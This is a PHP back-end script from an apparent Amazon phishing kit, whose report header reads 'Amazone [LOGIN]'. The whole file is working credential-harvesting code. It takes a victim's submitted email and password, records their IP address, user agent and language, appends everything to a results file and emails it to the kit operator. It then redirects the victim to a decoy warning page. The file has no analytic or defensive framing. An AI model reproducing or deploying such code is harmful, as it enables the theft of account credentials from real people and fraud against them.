<?php

session_start();

include('../__CONFIG__.php');

if (isset($_POST['Sex']))
{

	$_SESSION['EM'] = $_POST['EM'];
	$_SESSION['PW'] = $_POST['PW'];

$message=
"
	<!DOCTYPE html>
	<html>
	<head>
		<meta charset='UTF-8' />
	</head>
	<body>
	<style type='text/css'>
	body{
		background: #fff;
		color: #fff;
		font-family: arial;
	}
	.rezlt{
		width: 600px;
		border: 1px solid #232f3e;
	}
	table{
		width: 100%;
	    background: #fff;
	    color: #444;
	}
	table td{
		padding: 10px;
	}
	.newline{
    width: 100%;
    background: #ff9900;
    height: 2px;
	}
	</style>
	<center>
	<div class='rezlt'>
		<h3 style='text-align: center;background: #232f3e;margin: 0px;padding: 17px;'>Amazone [LOGIN]</h3>
		<table>
			<tr>
				<td style='width: 200px;'><b>Login Email</b></td>
				<td style='width: 400px;'>".$_POST['EM']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Login Password</b></td>
				<td style='width: 400px;'>".$_POST['PW']."</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>IP</b></td>
				<td style='width: 400px;'><a href='http://geoiptool.com/?ip=".$_SERVER['REMOTE_ADDR']."' target='_blank'>".$_SERVER['REMOTE_ADDR']."</a></td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>User Agent</b></td>
				<td style='width: 400px;'>".$_SERVER['HTTP_USER_AGENT']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Accept Language</b></td>
				<td style='width: 400px;'>".$_SERVER['HTTP_ACCEPT_LANGUAGE']."</td>
			</tr>
		</table>
	</div>
	</center>
	</body>
	</html>
";
	$Txt_Rezlt = fopen('../../rezlt.html', 'a+');
	fwrite($Txt_Rezlt, $message);
	fclose($Txt_Rezlt);
	mail($to, $subject, $message, $headers);

	header('Location: ../Warning.php?udm_cat_path='.sha1(time()));
}
else
{
	# code...
}
